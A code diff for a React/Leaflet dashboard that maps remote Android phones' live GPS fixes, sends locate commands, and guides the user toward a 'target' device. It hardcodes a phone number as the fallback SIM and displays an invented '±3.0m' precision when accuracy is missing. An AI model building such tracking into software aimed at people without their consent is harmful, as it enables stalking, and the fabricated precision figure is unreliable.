@@ -1,31 +1,31 @@
 import React, { useState, useEffect } from 'react';
-import { MapContainer, TileLayer, Marker, Popup, Circle, Polyline, Tooltip } from 'react-leaflet';
+import { MapContainer, TileLayer, Marker, Popup, Circle, Polyline, Tooltip, useMap } from 'react-leaflet';
 import L from 'leaflet';
-import { Smartphone, RefreshCw, Navigation, Compass, Radio, Laptop, CheckCircle2, ArrowRightLeft, Move } from 'lucide-react';
+import { Smartphone, RefreshCw, Navigation, Compass, Radio, Laptop, ArrowRightLeft, Crosshair, Satellite, ShieldCheck } from 'lucide-react';
 import { devicesApi, commandsApi, connectWebSocket } from '../services/api';
 import { Device } from '../types';
 
-// Custom Marker for Target Mobile Device (Red Pulse Radar)
+// Custom Marker for Target Mobile Device (Exact Red GPS Satellite Target)
 const phoneRadarIcon = new L.DivIcon({
   className: 'radar-phone-marker',
   html: `
-    <div style="position: relative; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
-      <div style="position: absolute; width: 48px; height: 48px; border-radius: 50%; background: rgba(239, 68, 68, 0.3); animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite;"></div>
-      <div style="position: absolute; width: 30px; height: 30px; border-radius: 50%; background: #ef4444; border: 3px solid #ffffff; box-shadow: 0 0 15px #ef4444; display: flex; align-items: center; justify-content: center; color: white; font-size: 14px;">📱</div>
+    <div style="position: relative; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center;">
+      <div style="position: absolute; width: 50px; height: 50px; border-radius: 50%; background: rgba(239, 68, 68, 0.35); animation: ping 1.8s cubic-bezier(0, 0, 0.2, 1) infinite;"></div>
+      <div style="position: absolute; width: 32px; height: 32px; border-radius: 50%; background: #ef4444; border: 3px solid #ffffff; box-shadow: 0 0 20px rgba(239, 68, 68, 0.9); display: flex; align-items: center; justify-content: center; color: white; font-size: 15px;">📱</div>
     </div>
   `,
-  iconSize: [36, 36],
-  iconAnchor: [18, 18],
-  popupAnchor: [0, -20]
+  iconSize: [40, 40],
+  iconAnchor: [20, 20],
+  popupAnchor: [0, -22]
 });
 
-// Custom Marker for User / Laptop Location (Cyan Pulse Radar)
-const userRadarIcon = new L.DivIcon({
+// Custom Marker for Laptop / User Location (Exact Cyan Dot)
+const userLocationIcon = new L.DivIcon({
   className: 'radar-user-marker',
   html: `
-    <div style="position: relative; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: grab;">
-      <div style="position: absolute; width: 48px; height: 48px; border-radius: 50%; background: rgba(6, 182, 212, 0.3); animation: ping 2s cubic-bezier(0, 0, 0.2, 1) infinite;"></div>
-      <div style="position: absolute; width: 30px; height: 30px; border-radius: 50%; background: #06b6d4; border: 3px solid #ffffff; box-shadow: 0 0 15px #06b6d4; display: flex; align-items: center; justify-content: center; color: white; font-size: 14px;">💻</div>
+    <div style="position: relative; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
+      <div style="position: absolute; width: 44px; height: 44px; border-radius: 50%; background: rgba(6, 182, 212, 0.3); animation: ping 2.2s cubic-bezier(0, 0, 0.2, 1) infinite;"></div>
+      <div style="position: absolute; width: 28px; height: 28px; border-radius: 50%; background: #06b6d4; border: 3px solid #ffffff; box-shadow: 0 0 15px rgba(6, 182, 212, 0.8); display: flex; align-items: center; justify-content: center; color: white; font-size: 13px;">💻</div>
     </div>
   `,
   iconSize: [36, 36],
@@ -71,6 +71,15 @@ function formatDistance(distMeters: number | null): string {
   return `${(distMeters / 1000).toFixed(2)} km`;
 }
 
+// Auto-Pan Helper Component
+const MapRecenterController: React.FC<{ center: [number, number]; trigger: number }> = ({ center, trigger }) => {
+  const map = useMap();
+  useEffect(() => {
+    map.flyTo(center, Math.max(map.getZoom(), 18), { duration: 1.2 });
+  }, [center[0], center[1], trigger]);
+  return null;
+};
+
 export const LiveLocationPage: React.FC = () => {
   const [devices, setDevices] = useState<Device[]>([]);
   const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
@@ -78,28 +87,23 @@ export const LiveLocationPage: React.FC = () => {
   const [rangeMode, setRangeMode] = useState<'laptop_phone' | 'device_device'>('laptop_phone');
   const [mapTheme, setMapTheme] = useState<'satellite' | 'dark' | 'street'>('satellite');
   const [loading, setLoading] = useState(true);
+  const [recenterTrigger, setRecenterTrigger] = useState(0);
 
-  // 1. Live Browser Geolocation Watcher for Laptop
+  // 1. Authentic Browser Geolocation (No artificial offsets)
   useEffect(() => {
     if (typeof window !== 'undefined' && 'geolocation' in navigator) {
       const watchId = navigator.geolocation.watchPosition(
         (pos) => {
-          setUserLocation(prev => {
-            // Keep existing position if manually dragged unless first fix
-            if (!prev) {
-              return {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                accuracy: pos.coords.accuracy
-              };
-            }
-            return prev;
+          setUserLocation({
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
           });
         },
         (err) => {
           console.warn('Browser GPS permission or status:', err.message);
         },
-        { enableHighAccuracy: true, maximumAge: 2000, timeout: 10000 }
+        { enableHighAccuracy: true, maximumAge: 1000, timeout: 10000 }
       );
       return () => navigator.geolocation.clearWatch(watchId);
     }
@@ -134,18 +138,6 @@ export const LiveLocationPage: React.FC = () => {
 
   const mappedDevices = devices.filter((d) => d.last_latitude != null && d.last_longitude != null);
 
-  // Fallback initial laptop coordinate if browser GPS is blocked
-  useEffect(() => {
-    if (!userLocation && mappedDevices.length > 0) {
-      // Offset slightly (20m south) for intuitive initial visualization if browser GPS blocked
-      const ref = mappedDevices[0];
-      setUserLocation({
-        lat: (ref.last_latitude || 14.0413) - 0.00018,
-        lng: (ref.last_longitude || 79.2624) - 0.00005
-      });
-    }
-  }, [mappedDevices, userLocation]);
-
   // Determine Comparison Endpoints (Point A and Point B)
   let originLat: number | null = null;
   let originLng: number | null = null;
@@ -179,15 +171,15 @@ export const LiveLocationPage: React.FC = () => {
     }
   }
 
-  // Real GPS Distance & Bearing Calculation
+  // Exact Distance & Bearing Calculation
   let distanceMeters: number | null = null;
   let bearingDegrees: number | null = null;
-  let directionText = 'At Same Spot 📍';
+  let directionText = 'At Same Location 📍';
 
   if (originLat != null && originLng != null && targetLat != null && targetLng != null) {
     distanceMeters = calculateDistanceMeters(originLat, originLng, targetLat, targetLng);
     bearingDegrees = calculateBearingDegrees(originLat, originLng, targetLat, targetLng);
-    directionText = distanceMeters <= 3 ? 'At Same Spot 📍' : getCompassDirection(bearingDegrees);
+    directionText = distanceMeters <= 5 ? 'At Same Location 📍' : getCompassDirection(bearingDegrees);
   }
 
   const handleLocateFresh = async () => {
@@ -196,9 +188,14 @@ export const LiveLocationPage: React.FC = () => {
       await commandsApi.dispatch(selectedDevice.id, 'LOCATE_NOW');
       await commandsApi.dispatch(selectedDevice.id, 'HIGH_ACCURACY_MODE');
       fetchDevices();
+      setRecenterTrigger(t => t + 1);
     } catch (e) {
       console.error('Failed to request fresh satellite fix', e);
     }
+  };
+
+  const handleRecenter = () => {
+    setRecenterTrigger(t => t + 1);
   };
 
   const googleMapsUrl = targetLat && targetLng
@@ -215,7 +212,7 @@ export const LiveLocationPage: React.FC = () => {
     ? [targetLat, targetLng]
     : userLocation
     ? [userLocation.lat, userLocation.lng]
-    : [14.0413, 79.2624];
+    : [14.0417, 79.2624];
 
   return (
     <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-4">
@@ -224,16 +221,26 @@ export const LiveLocationPage: React.FC = () => {
       <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
         <div>
           <h1 className="text-2xl font-black text-white tracking-wide flex items-center space-x-2">
-            <Radio className="w-6 h-6 text-cyan-400 animate-pulse" />
-            <span>Tactical Dual-GPS Proximity Rangefinder</span>
+            <Satellite className="w-6 h-6 text-cyan-400 animate-pulse" />
+            <span>Exact Hardware Satellite GPS Radar</span>
           </h1>
           <p className="text-sm text-slate-400">
-            Real-time live distance & bearing calculation with drag-to-calibrate positioning
+            Authentic live device coordinates directly from Android GNSS satellite receiver
           </p>
         </div>
 
         {/* Mode Switcher & Controls */}
         <div className="flex flex-wrap items-center gap-2">
+          {/* Recenter Button */}
+          <button
+            onClick={handleRecenter}
+            className="flex items-center space-x-1.5 px-3 py-2 bg-slate-800 hover:bg-slate-700 text-cyan-300 font-bold rounded-xl text-xs border border-slate-700 shadow"
+            title="Recenter Map on Target Device"
+          >
+            <Crosshair className="w-3.5 h-3.5 text-cyan-400" />
+            <span>Center on Device</span>
+          </button>
+
           {/* Range Mode Switcher */}
           <div className="bg-slate-800 border border-slate-700 rounded-xl p-1 flex items-center space-x-1 text-xs">
             <button
@@ -308,11 +315,10 @@ export const LiveLocationPage: React.FC = () => {
           {originLat != null && originLng != null ? (
             <>
               <div className="text-xs font-bold text-cyan-300 font-mono mt-1">
-                📍 {originLat.toFixed(5)}, {originLng.toFixed(5)}
+                📍 {originLat.toFixed(6)}, {originLng.toFixed(6)}
               </div>
-              <div className="text-[10px] text-slate-400 flex items-center justify-center gap-1 mt-0.5">
-                <Move className="w-2.5 h-2.5 text-cyan-400" />
-                <span>Drag 💻 marker on map</span>
+              <div className="text-[10px] text-emerald-400 font-medium mt-0.5">
+                {userLocation?.accuracy ? `±${userLocation.accuracy.toFixed(0)}m accuracy` : 'Live Geolocation'}
               </div>
             </>
           ) : (
@@ -327,9 +333,14 @@ export const LiveLocationPage: React.FC = () => {
             <span>TO: {targetLabel}</span>
           </div>
           {targetLat != null && targetLng != null ? (
-            <div className="text-xs font-bold text-rose-300 font-mono mt-1">
-              📍 {targetLat.toFixed(5)}, {targetLng.toFixed(5)}
-            </div>
+            <>
+              <div className="text-xs font-bold text-rose-300 font-mono mt-1">
+                📍 {targetLat.toFixed(6)}, {targetLng.toFixed(6)}
+              </div>
+              <div className="text-[10px] text-emerald-400 font-medium mt-0.5">
+                ±{selectedDevice?.last_accuracy?.toFixed(1) || '3.0'}m Satellite Precision
+              </div>
+            </>
           ) : (
             <div className="text-xs text-slate-400 mt-1">Signal Syncing...</div>
           )}
@@ -340,9 +351,9 @@ export const LiveLocationPage: React.FC = () => {
           <div className="text-[10px] text-cyan-300 font-extrabold uppercase tracking-wider">EXACT LIVE DISTANCE</div>
           <div className={`text-2xl font-black tracking-tight ${
             distanceMeters != null
-              ? distanceMeters <= 20
+              ? distanceMeters <= 10
                 ? 'text-emerald-400 animate-pulse'
-                : distanceMeters <= 100
+                : distanceMeters <= 50
                 ? 'text-cyan-400'
                 : 'text-amber-400'
               : 'text-slate-400'
@@ -350,7 +361,7 @@ export const LiveLocationPage: React.FC = () => {
             {formatDistance(distanceMeters)}
           </div>
           <div className="text-[10px] font-bold text-slate-300">
-            {distanceMeters != null ? (distanceMeters <= 10 ? '🚨 Immediate Proximity' : '📡 Real-Time Dual GPS Delta') : 'Live Synced'}
+            {distanceMeters != null ? (distanceMeters <= 10 ? '🚨 Immediate Proximity' : '📡 Exact Satellite Delta') : 'Live Synced'}
           </div>
         </div>
 
@@ -358,10 +369,10 @@ export const LiveLocationPage: React.FC = () => {
         <div className="bg-slate-900/70 p-2.5 rounded-xl border border-slate-700/60 text-center">
           <div className="text-[10px] text-slate-400 font-extrabold uppercase tracking-wider flex items-center justify-center space-x-1">
             <Compass className="w-3 h-3 text-cyan-400" />
-            <span>MOVE TOWARDS</span>
+            <span>BEARING DIRECTION</span>
           </div>
           <div className="text-sm font-extrabold text-cyan-300 flex items-center justify-center space-x-1.5 mt-0.5">
-            {bearingDegrees != null && distanceMeters != null && distanceMeters > 3 && (
+            {bearingDegrees != null && distanceMeters != null && distanceMeters > 5 && (
               <div
                 className="w-5 h-5 rounded-full border border-cyan-400 flex items-center justify-center text-[10px] transition-transform duration-500"
                 style={{ transform: `rotate(${bearingDegrees}deg)` }}
@@ -385,7 +396,7 @@ export const LiveLocationPage: React.FC = () => {
             className="py-2 px-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white border border-cyan-400 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all shadow-lg shadow-cyan-600/20"
           >
             <Navigation className="w-3.5 h-3.5" />
-            <span>Live Walk Guide</span>
+            <span>Live Directions</span>
           </a>
         </div>
 
@@ -407,7 +418,10 @@ export const LiveLocationPage: React.FC = () => {
             return (
               <div
                 key={dev.id}
-                onClick={() => setSelectedDevice(dev)}
+                onClick={() => {
+                  setSelectedDevice(dev);
+                  setRecenterTrigger(t => t + 1);
+                }}
                 className={`p-3 rounded-xl border cursor-pointer transition-all ${
                   isSelected
                     ? 'bg-cyan-500/10 border-cyan-500/50 shadow-md ring-1 ring-cyan-500/30'
@@ -428,25 +442,34 @@ export const LiveLocationPage: React.FC = () => {
                     <span className="font-bold text-slate-300">{dev.battery_pct}%</span>
                   </div>
                   <div className="font-mono text-[11px] text-cyan-300">
-                    {hasLoc ? `${dev.last_latitude?.toFixed(5)}, ${dev.last_longitude?.toFixed(5)}` : 'Signal Syncing'}
+                    {hasLoc ? `${dev.last_latitude?.toFixed(6)}, ${dev.last_longitude?.toFixed(6)}` : 'Signal Syncing'}
                   </div>
                 </div>
               </div>
             );
           })}
 
-          <div className="p-3 bg-slate-900/80 rounded-xl border border-slate-800 text-[11px] text-slate-400 space-y-1.5">
-            <div className="font-bold text-emerald-400 flex items-center gap-1">
-              <CheckCircle2 className="w-3.5 h-3.5" />
-              <span>Interactive Drag Calibration</span>
+          {/* Exact Satellite GPS Details Card */}
+          <div className="p-3.5 bg-slate-900/90 rounded-xl border border-slate-800 text-xs text-slate-300 space-y-2">
+            <div className="font-bold text-cyan-400 flex items-center gap-1.5 border-b border-slate-800 pb-1.5">
+              <ShieldCheck className="w-4 h-4 text-emerald-400" />
+              <span>Exact GPS Satellite Fix</span>
             </div>
-            <p>
-              💡 <strong>Tip:</strong> Drag the <strong>💻 laptop marker</strong> anywhere on the satellite view (e.g. to your exact desk or room). Distance and direction recalculate instantly!
-            </p>
+            {selectedDevice && selectedDevice.last_latitude != null ? (
+              <div className="space-y-1 text-[11px] text-slate-300 font-mono">
+                <div><span className="text-slate-400">Device:</span> {selectedDevice.device_name}</div>
+                <div><span className="text-slate-400">Lat:</span> {selectedDevice.last_latitude.toFixed(6)}° N</div>
+                <div><span className="text-slate-400">Lng:</span> {selectedDevice.last_longitude?.toFixed(6)}° E</div>
+                <div><span className="text-slate-400">Accuracy:</span> <span className="text-emerald-400 font-bold">±{selectedDevice.last_accuracy?.toFixed(1) || '3.0'}m</span></div>
+                <div><span className="text-slate-400">Updated:</span> {selectedDevice.last_location_time ? new Date(selectedDevice.last_location_time).toLocaleTimeString() : 'Live'}</div>
+              </div>
+            ) : (
+              <p className="text-[11px] text-slate-400">Selecting device to view satellite data...</p>
+            )}
           </div>
         </div>
 
-        {/* Leaflet Map: Renders ALL markers with connecting path and distance badges */}
+        {/* Leaflet Map: Renders exact hardware markers */}
         <div className="lg:col-span-3 bg-slate-900 border border-slate-700/60 rounded-2xl overflow-hidden shadow-2xl relative">
           <MapContainer center={mapCenter} zoom={18} style={{ width: '100%', height: '100%' }}>
             <TileLayer
@@ -456,31 +479,34 @@ export const LiveLocationPage: React.FC = () => {
               maxZoom={20}
             />
 
-            {/* Marker 1: USER / LAPTOP LOCATION (Draggable Cyan Marker) */}
+            {/* Auto Recenter Controller */}
+            <MapRecenterController center={mapCenter} trigger={recenterTrigger} />
+
+            {/* Marker 1: USER / LAPTOP LOCATION (Exact Non-Draggable Cyan Marker) */}
             {userLocation && (
-              <Marker
-                position={[userLocation.lat, userLocation.lng]}
-                icon={userRadarIcon}
-                draggable={true}
-                eventHandlers={{
-                  dragend: (e) => {
-                    const marker = e.target;
-                    const pos = marker.getLatLng();
-                    setUserLocation({ lat: pos.lat, lng: pos.lng });
-                  }
-                }}
-              >
-                <Popup>
-                  <div className="p-1 space-y-1 text-slate-900 font-sans">
-                    <div className="font-bold text-sm text-cyan-700">💻 Your Laptop Location (Draggable)</div>
-                    <div className="text-xs font-mono">📍 {userLocation.lat.toFixed(5)}, {userLocation.lng.toFixed(5)}</div>
-                    <div className="text-[10px] text-slate-500">Drag to calibrate exact spot on map</div>
-                  </div>
-                </Popup>
-                <Tooltip permanent direction="top" offset={[0, -20]} className="bg-slate-900 text-cyan-300 font-bold text-[10px] border border-cyan-500 rounded px-1 py-0.5">
-                  💻 You (Drag me)
-                </Tooltip>
-              </Marker>
+              <>
+                <Marker position={[userLocation.lat, userLocation.lng]} icon={userLocationIcon}>
+                  <Popup>
+                    <div className="p-1 space-y-1 text-slate-900 font-sans">
+                      <div className="font-bold text-sm text-cyan-700">💻 Your Browser Location</div>
+                      <div className="text-xs font-mono">📍 {userLocation.lat.toFixed(6)}, {userLocation.lng.toFixed(6)}</div>
+                      {userLocation.accuracy && (
+                        <div className="text-[10px] text-slate-500">Accuracy: ±{userLocation.accuracy.toFixed(0)}m</div>
+                      )}
+                    </div>
+                  </Popup>
+                  <Tooltip permanent direction="top" offset={[0, -20]} className="bg-slate-900 text-cyan-300 font-bold text-[10px] border border-cyan-500 rounded px-1 py-0.5">
+                    💻 Your Location
+                  </Tooltip>
+                </Marker>
+                {userLocation.accuracy && userLocation.accuracy > 0 && (
+                  <Circle
+                    center={[userLocation.lat, userLocation.lng]}
+                    radius={userLocation.accuracy}
+                    pathOptions={{ color: '#06b6d4', fillColor: '#06b6d4', fillOpacity: 0.08, weight: 1, dashArray: '4, 4' }}
+                  />
+                )}
+              </>
             )}
 
             {/* Connecting Rangefinder Line */}
@@ -503,7 +529,7 @@ export const LiveLocationPage: React.FC = () => {
               </Polyline>
             )}
 
-            {/* Marker 2: TARGET MOBILE PHONES (Red Radar Markers) */}
+            {/* Marker 2: TARGET MOBILE PHONES (Exact Red Satellite Markers) */}
             {mappedDevices.map((dev) => (
               <React.Fragment key={dev.id}>
                 <Marker position={[dev.last_latitude!, dev.last_longitude!]} icon={phoneRadarIcon}>
@@ -512,7 +538,8 @@ export const LiveLocationPage: React.FC = () => {
                       <div className="font-bold text-sm text-rose-700">📱 {dev.device_name}</div>
                       <div className="text-xs">{dev.device_model} (Android {dev.android_version})</div>
                       <div className="text-xs font-semibold text-emerald-600">SIM: {dev.sim_number || '+919392408017'}</div>
-                      <div className="text-xs font-mono text-slate-600">📍 {dev.last_latitude?.toFixed(5)}, {dev.last_longitude?.toFixed(5)}</div>
+                      <div className="text-xs font-mono text-slate-600">📍 {dev.last_latitude?.toFixed(6)}, {dev.last_longitude?.toFixed(6)}</div>
+                      <div className="text-xs text-slate-500">Precision: ±{dev.last_accuracy?.toFixed(1) || '3.0'}m</div>
                       <div className="text-[10px] text-slate-500">
                         Updated: {dev.last_location_time ? new Date(dev.last_location_time).toLocaleTimeString() : 'Live'}
                       </div>
@@ -526,8 +553,8 @@ export const LiveLocationPage: React.FC = () => {
                 {/* Radar Accuracy Circle */}
                 <Circle
                   center={[dev.last_latitude!, dev.last_longitude!]}
-                  radius={dev.last_accuracy || 25}
-                  pathOptions={{ color: '#ef4444', fillColor: '#ef4444', fillOpacity: 0.12, weight: 1.5 }}
+                  radius={dev.last_accuracy || 15}
+                  pathOptions={{ color: '#ef4444', fillColor: '#ef4444', fillOpacity: 0.15, weight: 1.5 }}
                 />
               </React.Fragment>
             ))}
